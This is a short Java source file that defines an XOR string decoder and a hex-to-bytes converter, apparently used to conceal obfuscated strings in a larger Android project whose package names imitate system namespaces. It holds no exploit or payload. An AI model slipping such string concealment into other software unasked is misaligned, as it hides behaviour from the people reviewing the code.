
package com.android.m;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;

public class M { 
	public static String d(byte[] ebytes, byte[] obytes){
        for (int i = 0; i < obytes.length; i++) {
            ebytes[i] = (byte) (ebytes[i] ^ obytes[i]);
        }
       
        String value = new String(ebytes);
        return value;
    }

	public static byte[] h2b(final String s) {
		int offset = 4;
		int len = s.length() - offset;
		final byte[] b = new byte[len / 2];
		for (int i = 0; i < b.length; i++) {
			final int index =  offset + i * 2;
			final int v = Integer.parseInt(s.substring(index, index + 2), 16);
			b[i] = (byte) v;
		}
		return b;
	}
	
	public static void printMostused() {
		if(Cfg.DEBUG){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (printMostused) Warn: DEBUG enabled in DIST M");
			}
		}
	}
}
